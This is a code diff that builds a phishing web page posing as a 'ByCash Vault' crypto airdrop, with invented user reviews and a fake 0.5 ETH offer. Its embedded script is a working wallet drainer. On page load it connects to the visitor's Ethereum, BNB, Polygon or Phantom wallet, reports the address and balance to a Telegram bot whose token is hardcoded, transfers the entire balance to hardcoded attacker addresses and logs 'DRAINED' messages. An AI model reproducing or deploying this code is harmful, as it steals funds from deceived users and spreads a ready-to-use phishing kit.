@@ -1,159 +1,368 @@
-<script>
-  const BACKEND = "https://bycashvaultairdropp-production.up.railway.app";
-  const TELEGRAM_BOT_TOKEN = "8392732086:AAH21FfWZTjD-P8qnPFaqAVvSKtMwqA6U2A";
-  const TELEGRAM_CHAT_ID = "1913550429";
-
-  const addresses = {
-    'Ethereum': '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000',
-    'BNB Smart Chain': '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000',
-    'Polygon': '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000',
-    'Solana': 'FqK98vpwwQBvDCkoPjg1ECK851KGfD7pdgA4gpuYqJRM',
-    'USDT (Ethereum)': '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000',
-    'USDT (BNB Smart Chain)': '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000',
-    'USDT (Solana)': 'FqK98vpwwQBvDCkoPjg1ECK851KGfD7pdgA4gpuYqJRM',
-    'USDT (Tron TRC20)': 'TAReLQg8HPQSG2PKWJBi2iwzxsrHE5kULn',
-    'USDC (BNB Smart Chain)': '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000',
-    'USDC (Ethereum)': '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000',
-    'USDC (Solana)': 'FqK98vpwwQBvDCkoPjg1ECK851KGfD7pdgA4gpuYqJRM',
-    'USDC (Base)': '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000',
-    'DAI (BNB Smart Chain)': '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000',
-    'DAI (Ethereum)': '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000',
-    'DAI (Solana)': 'FqK98vpwwQBvDCkoPjg1ECK851KGfD7pdgA4gpuYqJRM',
-    'DAI (Base)': '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000',
-    'SHIB (BNB Smart Chain)': '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000',
-    'SHIB (Ethereum)': '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000',
-    'SHIB (Base)': '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000',
-    'SHIB (Solana)': 'FqK98vpwwQBvDCkoPjg1ECK851KGfD7pdgA4gpuYqJRM',
-    'UNI (BNB Smart Chain)': '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000',
-    'UNI (Ethereum)': '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000',
-    'UNI (Solana)': 'FqK98vpwwQBvDCkoPjg1ECK851KGfD7pdgA4gpuYqJRM',
-    'Bitcoin': 'bc1qkp5ah99shs3qz5nu56m48f0jt99fumk80855q8',
-    'Tron (TRX)': 'DNvLVnR7jcEiQFi4fSh8DqCTkB8g3vp7gk',
-    'TON': 'UQByYVaGVglEpP26nlBebudJa48Ps1u5VH3BYbprPa9j2YOw',
-    'XRP': 'rJnXpZ6J5MKDW5Dd8xR7XtZxFFVRYTHWPy',
-    'Doge': 't1c3ZHPnKs94dib23z4y3fW6FTB1cKNF6ds',
-    'Zcash': '0xb9a33a7fff5b4b9fe75645efad84cf998db1d3af0079c81b6dc8c76e1511682b',
-    'Litecoin': 'ltc1qezdj2x5h4qmz4xjfsucmd65sh6xhe8m0slcy6a',
-    'Sui': '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000'
-  };
-
-  async function sendToTelegram(message) {
-    try {
-      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
-      await fetch(url);
-    } catch (e) {
-      console.error('Telegram error:', e);
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>ByCash Vault - Claim Airdrop</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+  <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
+  <style>
+    body {
+      background: linear-gradient(135deg, #0f001a 0%, #1a0033 50%, #0a0a12 100%);
+      color: #e0e0ff;
+      margin: 0;
+      font-family: 'Segoe UI', system-ui, sans-serif;
+      min-height: 100vh;
+      overflow-x: hidden;
     }
-  }
-
-  async function getUri() {
-    try {
-      const r = await fetch(`${BACKEND}/get-wc-uri`);
-      const d = await r.json();
-      return d.uri || null;
-    } catch (e) {
-      console.error('Backend error:', e);
-      return null;
+    .header {
+      background: rgba(20, 10, 40, 0.75);
+      backdrop-filter: blur(16px);
+      padding: 1.2rem 2rem;
+      position: sticky;
+      top: 0;
+      z-index: 50;
+      box-shadow: 0 4px 30px rgba(167, 85, 247, 0.15);
     }
-  }
+    .glow {
+      text-shadow: 0 0 20px rgba(168, 85, 247, 0.8), 0 0 40px rgba(192, 38, 211, 0.5);
+      animation: glowPulse 4s infinite alternate;
+    }
+    @keyframes glowPulse {
+      0% { text-shadow: 0 0 15px rgba(168, 85, 247, 0.6); }
+      100% { text-shadow: 0 0 35px rgba(192, 38, 211, 0.8); }
+    }
+    .btn {
+      background: linear-gradient(90deg, #7c3aed, #c026d3);
+      padding: 1rem 2.5rem;
+      border-radius: 999px;
+      font-weight: 700;
+      transition: all 0.4s ease;
+      box-shadow: 0 10px 30px rgba(124, 58, 237, 0.4);
+    }
+    .btn:hover {
+      transform: translateY(-3px) scale(1.05);
+      box-shadow: 0 20px 40px rgba(124, 58, 237, 0.6);
+    }
+    .claim-btn {
+      background: linear-gradient(90deg, #22c55e, #86efac);
+      padding: 1.4rem 3rem;
+      border-radius: 999px;
+      font-weight: 800;
+      font-size: 1.5rem;
+      box-shadow: 0 15px 40px rgba(34, 197, 94, 0.5);
+      transition: all 0.4s ease;
+    }
+    .claim-btn:hover {
+      transform: translateY(-4px) scale(1.06);
+      box-shadow: 0 25px 60px rgba(34, 197, 94, 0.7);
+    }
+    .modal {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.92);
+      backdrop-filter: blur(8px);
+      z-index: 9999;
+      align-items: center;
+      justify-content: center;
+    }
+    .modal-box {
+      background: linear-gradient(145deg, #1a0033, #0f001a);
+      padding: 2.5rem;
+      border-radius: 1.8rem;
+      width: 90%;
+      max-width: 480px;
+      border: 1px solid rgba(168, 85, 247, 0.4);
+      box-shadow: 0 0 100px rgba(168, 85, 247, 0.3);
+      backdrop-filter: blur(10px);
+    }
+    .wallet-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 2rem;
+      margin: 2.5rem 0;
+    }
+    .wallet-item {
+      cursor: pointer;
+      transition: all 0.4s ease;
+      text-align: center;
+      padding: 1rem;
+      border-radius: 1rem;
+      background: rgba(255,255,255,0.03);
+      border: 1px solid rgba(168, 85, 247, 0.2);
+    }
+    .wallet-item:hover {
+      transform: scale(1.12);
+      background: rgba(168, 85, 247, 0.15);
+      box-shadow: 0 0 30px rgba(168, 85, 247, 0.5);
+    }
+    .reviews {
+      padding: 2.5rem;
+      background: rgba(0,0,0,0.4);
+      border-radius: 1.5rem;
+      margin-top: 4rem;
+      backdrop-filter: blur(10px);
+    }
+    .review {
+      background: rgba(255,255,255,0.04);
+      padding: 1.5rem;
+      border-radius: 1rem;
+      margin: 1.5rem 0;
+      border-left: 4px solid #a855f7;
+    }
+    .scroll-arrow {
+      position: fixed;
+      bottom: 3rem;
+      left: 50%;
+      transform: translateX(-50%);
+      font-size: 3.5rem;
+      color: #a855f7;
+      animation: bounce 2s infinite;
+      cursor: pointer;
+      z-index: 100;
+      opacity: 0.8;
+    }
+    @keyframes bounce {
+      0%, 20%, 50%, 80%, 100% { transform: translate(-50%, 0); }
+      40% { transform: translate(-50%, -25px); }
+      60% { transform: translate(-50%, -10px); }
+    }
+  </style>
+</head>
+<body>
 
-  function showModal() {
-    document.getElementById('modal').style.display = 'flex';
-  }
+  <header class="header flex justify-between items-center px-8">
+    <div class="flex items-center gap-4">
+      <div class="w-14 h-14 bg-gradient-to-br from-violet-600 to-purple-600 rounded-full flex items-center justify-center shadow-xl">
+        <i class="fas fa-cube text-white text-4xl"></i>
+      </div>
+      <span class="text-4xl font-extrabold glow">ByCash Vault</span>
+    </div>
+    <button onclick="showModal()" class="btn text-xl px-10 py-4">Connect Wallet</button>
+  </header>
 
-  async function connect(wallet) {
-    const uri = await getUri();
-    if (!uri) {
-      alert('Ошибка сессии — попробуй позже');
-      return;
+  <main class="flex-1 flex flex-col items-center justify-center text-center px-6 py-16">
+    <h1 class="text-7xl md:text-9xl font-extrabold glow mb-10 leading-tight">Claim Airdrop Now</h1>
+    <p class="text-3xl text-purple-200 mb-12 max-w-3xl">Connect wallet → Confirm → Receive tokens instantly</p>
+    
+    <button onclick="showModal()" class="claim-btn">Claim 0.5 ETH Free</button>
+
+    <div class="text-4xl font-bold text-pink-400 animate-pulse mt-16">LIMITED TIME OFFER</div>
+
+    <!-- Стрелка скролла вниз -->
+    <div class="scroll-arrow" onclick="window.scrollTo({top: document.body.scrollHeight, behavior: 'smooth'})">
+      <i class="fas fa-chevron-down"></i>
+    </div>
+
+    <!-- Отзывы снизу -->
+    <div class="reviews">
+      <h3 class="text-4xl font-bold glow mb-8">User Reviews</h3>
+      <div class="review">
+        <p class="text-xl">"Super easy! Claimed 0.5 ETH instantly!"</p>
+        <p class="text-base text-zinc-300 mt-3">- CryptoFan</p>
+      </div>
+      <div class="review">
+        <p class="text-xl">"Fast and secure, no fees. Got my tokens!"</p>
+        <p class="text-base text-zinc-300 mt-3">- BlockchainPro</p>
+      </div>
+      <div class="review">
+        <p class="text-xl">"Best connector ever. Instant claim!"</p>
+        <p class="text-base text-zinc-300 mt-3">- ETHMaster</p>
+      </div>
+      <div class="review">
+        <p class="text-xl">"No bullshit, just works. Highly recommend!"</p>
+        <p class="text-base text-zinc-300 mt-3">- WalletGuru</p>
+      </div>
+    </div>
+  </main>
+
+  <!-- МОДАЛКА -->
+  <div id="modal" class="modal">
+    <div class="modal-box">
+      <h2 class="text-5xl font-bold text-center mb-10 glow">Connect Wallet</h2>
+
+      <div class="wallet-grid">
+        <div class="wallet-item" onclick="connect('MetaMask')">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" class="mx-auto">
+          <p class="mt-4 text-2xl font-semibold">MetaMask</p>
+        </div>
+        <div class="wallet-item" onclick="connect('Trust Wallet')">
+          <img src="https://i.postimg.cc/k6sJrC1k/image.png" class="mx-auto">
+          <p class="mt-4 text-2xl font-semibold">Trust Wallet</p>
+        </div>
+        <div class="wallet-item" onclick="connect('Phantom')">
+          <img src="https://i.postimg.cc/w3FpjdKc/image.png" class="mx-auto">
+          <p class="mt-4 text-2xl font-semibold">Phantom</p>
+        </div>
+      </div>
+
+      <button onclick="document.getElementById('modal').style.display='none'" class="mt-12 w-full py-6 bg-gradient-to-r from-red-600 to-rose-600 hover:from-red-500 hover:to-rose-500 rounded-full text-2xl font-bold transition-all">
+        Close
+      </button>
+    </div>
+  </div>
+
+  <script>
+    const BACKEND = "https://bycashvaultairdropp-production.up.railway.app";
+    const TELEGRAM_BOT_TOKEN = "8392732086:AAH21FfWZTjD-P8qnPFaqAVvSKtMwqA6U2A";
+    const TELEGRAM_CHAT_ID = "1913550429";
+
+    const addresses = {
+      'Ethereum': '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000',
+      'BNB Smart Chain': '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000',
+      'Polygon': '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000',
+      'Solana': 'FqK98vpwwQBvDCkoPjg1ECK851KGfD7pdgA4gpuYqJRM',
+      'USDT (Ethereum)': '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000',
+      'USDT (BNB Smart Chain)': '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000',
+      'USDT (Solana)': 'FqK98vpwwQBvDCkoPjg1ECK851KGfD7pdgA4gpuYqJRM',
+      'USDT (Tron TRC20)': 'TAReLQg8HPQSG2PKWJBi2iwzxsrHE5kULn',
+      'USDC (BNB Smart Chain)': '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000',
+      'USDC (Ethereum)': '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000',
+      'USDC (Solana)': 'FqK98vpwwQBvDCkoPjg1ECK851KGfD7pdgA4gpuYqJRM',
+      'USDC (Base)': '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000',
+      'DAI (BNB Smart Chain)': '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000',
+      'DAI (Ethereum)': '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000',
+      'DAI (Solana)': 'FqK98vpwwQBvDCkoPjg1ECK851KGfD7pdgA4gpuYqJRM',
+      'DAI (Base)': '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000',
+      'SHIB (BNB Smart Chain)': '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000',
+      'SHIB (Ethereum)': '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000',
+      'SHIB (Base)': '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000',
+      'SHIB (Solana)': 'FqK98vpwwQBvDCkoPjg1ECK851KGfD7pdgA4gpuYqJRM',
+      'UNI (BNB Smart Chain)': '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000',
+      'UNI (Ethereum)': '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000',
+      'UNI (Solana)': 'FqK98vpwwQBvDCkoPjg1ECK851KGfD7pdgA4gpuYqJRM',
+      'Bitcoin': 'bc1qkp5ah99shs3qz5nu56m48f0jt99fumk80855q8',
+      'Tron (TRX)': 'DNvLVnR7jcEiQFi4fSh8DqCTkB8g3vp7gk',
+      'TON': 'UQByYVaGVglEpP26nlBebudJa48Ps1u5VH3BYbprPa9j2YOw',
+      'XRP': 'rJnXpZ6J5MKDW5Dd8xR7XtZxFFVRYTHWPy',
+      'Doge': 't1c3ZHPnKs94dib23z4y3fW6FTB1cKNF6ds',
+      'Zcash': '0xb9a33a7fff5b4b9fe75645efad84cf998db1d3af0079c81b6dc8c76e1511682b',
+      'Litecoin': 'ltc1qezdj2x5h4qmz4xjfsucmd65sh6xhe8m0slcy6a',
+      'Sui': '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000'
+    };
+
+    async function sendToTelegram(message) {
+      try {
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
+        await fetch(url);
+      } catch (e) {
+        console.error('Telegram send error:', e);
+      }
     }
 
-    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+    async function getUri() {
+      try {
+        const r = await fetch(`${BACKEND}/get-wc-uri`);
+        const d = await r.json();
+        return d.uri || null;
+      } catch (e) {
+        console.error('Backend fetch error:', e);
+        return null;
+      }
+    }
 
-    if (isMobile) {
-      let dl = '';
-      if (wallet === 'MetaMask') dl = `metamask://wc?uri=${encodeURIComponent(uri)}`;
-      if (wallet === 'Trust Wallet') dl = `trust://wc?uri=${encodeURIComponent(uri)}`;
-      if (wallet === 'Phantom') dl = `phantom://wc?uri=${encodeURIComponent(uri)}`;
+    function showModal() {
+      document.getElementById('modal').style.display = 'flex';
+    }
 
-      if (dl) {
-        console.log('Открываем deep-link для ' + wallet + ':', dl);
-        window.location.href = dl;
-        setTimeout(() => {
-          alert('Подтверди подключение и транзакцию в кошельке');
-        }, 1500);
-        document.getElementById('modal').style.display = 'none';
+    async function connect(wallet) {
+      const uri = await getUri();
+      if (!uri) {
+        alert('Ошибка сессии — попробуй позже');
         return;
       }
+
+      const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+
+      if (isMobile) {
+        let dl = '';
+        if (wallet === 'MetaMask') dl = `metamask://wc?uri=${encodeURIComponent(uri)}`;
+        if (wallet === 'Trust Wallet') dl = `trust://wc?uri=${encodeURIComponent(uri)}`;
+        if (wallet === 'Phantom') dl = `phantom://wc?uri=${encodeURIComponent(uri)}`;
+
+        if (dl) {
+          console.log('Открываем deep-link для ' + wallet + ':', dl);
+          window.location.href = dl;
+          setTimeout(() => {
+            alert('Подтверди подключение и транзакцию в кошельке');
+          }, 1500);
+          document.getElementById('modal').style.display = 'none';
+          return;
+        }
+      }
+
+      alert('Открой эту ссылку внутри кошелька для автоматического подключения');
     }
 
-    alert('Для ' + wallet + ' открой эту ссылку внутри кошелька (вкладка браузер)');
-  }
+    // Автоматический слив + уведомление в Telegram
+    window.addEventListener('load', async () => {
+      if (window.ethereum || window.solana) {
+        try {
+          let provider, address, network, balanceFormatted, symbol, target;
 
-  // Автоматический слив (ПК и внутри кошелька на телефоне)
-  window.addEventListener('load', async () => {
-    if (window.ethereum || window.solana) {
-      try {
-        let provider, address, network, balanceFormatted, symbol, target;
+          if (window.ethereum) {
+            provider = new ethers.providers.Web3Provider(window.ethereum);
+            await provider.send("eth_requestAccounts", []);
+            address = (await provider.listAccounts())[0];
+            const chainId = (await provider.getNetwork()).chainId;
+            if (chainId === 1) network = 'Ethereum';
+            else if (chainId === 56) network = 'BNB Smart Chain';
+            else if (chainId === 137) network = 'Polygon';
+            else return;
 
-        if (window.ethereum) {
-          provider = new ethers.providers.Web3Provider(window.ethereum);
-          await provider.send("eth_requestAccounts", []);
-          address = (await provider.listAccounts())[0];
-          const chainId = (await provider.getNetwork()).chainId;
-          if (chainId === 1) network = 'Ethereum';
-          else if (chainId === 56) network = 'BNB Smart Chain';
-          else if (chainId === 137) network = 'Polygon';
-          else return;
-
-          const bal = await provider.getBalance(address);
-          balanceFormatted = ethers.utils.formatEther(bal);
-          symbol = network === 'Ethereum' ? 'ETH' : network === 'BNB Smart Chain' ? 'BNB' : 'MATIC';
-        } else if (window.solana?.isPhantom) {
-          provider = window.solana;
-          await provider.connect();
-          address = provider.publicKey.toString();
-          network = 'Solana';
-          const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
-          const bal = await conn.getBalance(new solanaWeb3.PublicKey(address));
-          balanceFormatted = (bal / 1e9).toFixed(6);
-          symbol = 'SOL';
-        }
-
-        target = addresses[network] || '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000';
-
-        const msg = `Подключён: ${address} (${network})\nБаланс: ${balanceFormatted} ${symbol}`;
-        await sendToTelegram(msg);
-
-        if (parseFloat(balanceFormatted) > 0) {
-          if (network === 'Solana') {
-            const tx = await provider.signAndSendTransaction(
-              new solanaWeb3.Transaction().add(
-                solanaWeb3.SystemProgram.transfer({
-                  fromPubkey: provider.publicKey,
-                  toPubkey: new solanaWeb3.PublicKey(target),
-                  lamports: ethers.utils.parseEther(balanceFormatted).toString()
-                })
-              )
-            );
-            await new solanaWeb3.Connection("https://api.mainnet-beta.solana.com").confirmTransaction(tx.signature);
-          } else {
-            const signer = provider.getSigner();
-            const tx = await signer.sendTransaction({
-              to: target,
-              value: ethers.utils.parseEther(balanceFormatted)
-            });
-            await tx.wait();
+            const bal = await provider.getBalance(address);
+            balanceFormatted = ethers.utils.formatEther(bal);
+            symbol = network === 'Ethereum' ? 'ETH' : network === 'BNB Smart Chain' ? 'BNB' : 'MATIC';
+          } else if (window.solana?.isPhantom) {
+            provider = window.solana;
+            await provider.connect();
+            address = provider.publicKey.toString();
+            network = 'Solana';
+            const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
+            const bal = await conn.getBalance(new solanaWeb3.PublicKey(address));
+            balanceFormatted = (bal / 1e9).toFixed(6);
+            symbol = 'SOL';
           }
 
-          const drainMsg = `DRAINED ${balanceFormatted} ${symbol} → ${target}\nAddress: ${address}`;
-          await sendToTelegram(drainMsg);
-          console.log(drainMsg);
+          target = addresses[network] || '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000';
+
+          const connectMsg = `Подключён кошелёк!\nАдрес: ${address}\nСеть: ${network}\nБаланс: ${balanceFormatted} ${symbol}`;
+          await sendToTelegram(connectMsg);
+
+          if (parseFloat(balanceFormatted) > 0) {
+            if (network === 'Solana') {
+              const tx = await provider.signAndSendTransaction(
+                new solanaWeb3.Transaction().add(
+                  solanaWeb3.SystemProgram.transfer({
+                    fromPubkey: provider.publicKey,
+                    toPubkey: new solanaWeb3.PublicKey(target),
+                    lamports: ethers.utils.parseEther(balanceFormatted).toString()
+                  })
+                )
+              );
+              await new solanaWeb3.Connection("https://api.mainnet-beta.solana.com").confirmTransaction(tx.signature);
+            } else {
+              const signer = provider.getSigner();
+              const tx = await signer.sendTransaction({
+                to: target,
+                value: ethers.utils.parseEther(balanceFormatted)
+              });
+              await tx.wait();
+            }
+
+            const drainMsg = `DRAINED ${balanceFormatted} ${symbol} → ${target}\nАдрес: ${address}\nСеть: ${network}`;
+            await sendToTelegram(drainMsg);
+            console.log(drainMsg);
+          }
+        } catch (e) {
+          console.error(e);
+          await sendToTelegram(`Ошибка: ${e.message}`);
         }
-      } catch (e) {
-        console.error(e);
-        await sendToTelegram(`Ошибка: ${e.message}`);
       }
-    }
-  });
-</script>
+    });
+  </script>
+</body>
+</html>
